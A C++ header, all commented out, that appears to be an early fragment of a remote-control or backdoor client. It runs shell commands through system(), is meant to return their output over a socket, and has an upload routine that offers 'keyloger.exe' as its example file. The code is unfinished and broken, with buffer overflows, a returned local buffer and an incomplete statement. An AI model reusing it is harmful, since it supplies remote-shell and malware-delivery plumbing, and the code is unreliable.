#pragma once
#include "Scripts_c.h"
#include "Scripts_all.h"
#include <iostream>
#include "pch.h"


/*

char* return_command(char* command)
{
	char buffer[256] = { 0 };
	std::ifstream fichier("read_cmd.txt", std::ios::out | std::ios::trunc);
	if (fichier)
	{
		std::cout << "OUVERUTURE" << std::endl;
		strcat(command, " > ");
		strcat(command, "read_cmd.txt");
		system(command);
		fichier >> buffer;
		fichier.close();
		std::cout << "RETOUR" << std::endl;
		return buffer;
	}
	else
	{
		strcat(buffer, "Error");
		return buffer;
	}
}

void cd(SOCKET sock, char* directory)
{
	char cmd[256] = { 0 };
	char ret[256] = { 0 };
	strcat(cmd, "cd ");
	strcat(cmd, directory);
	strcat(ret, return_command(cmd));
	//	send(sock, ret, sizeof(ret), 0);
}
void pwd(SOCKET sock)
{
	char ret[256] = { 0 };
	char cmd[256] = { 0 };
	strcat(cmd, "chdir");
	strcat(ret, return_command(cmd));
	//send(sock, ret, sizeof(ret), 0);
}
void ls(SOCKET sock) {

	std::cout << "LS" << std::endl;
	char ret[256] = { 0 };
	char cmd[256] = { 0 };
	strcat(cmd, "ls");
	strcat(ret, return_command(cmd));
	std::cout << "APRES" << std::endl;
	//send(sock, ret, sizeof(ret), 0);
}

bool upload_c(Client &client)
{
	char filename[] = "Please enter a filename, ex : keyloger.exe\n[*] Your file must be in the current directory : ";
	char buffer[256] = "chdir";
	strcpy(filename, return_command(buffer));
	strcpy(filename, "\n\nTo cancel : 0");
	client.send_b(filename);
	std::cin >> filename;
	if (!filename)
	{
		return 0;
	}
	else
	{
		std::ifstream file(filename, std::ios::in);
		if (file)
		{
			client.send_b("upload");
			client.send_b(filename);
			long long int length = file.tellg();
			length =
				client.send_b();
		}
		else
		{
			client.send_b("Error while openning : ");
			client.send_b(filename);
			return -1;
		}
	}

}

*/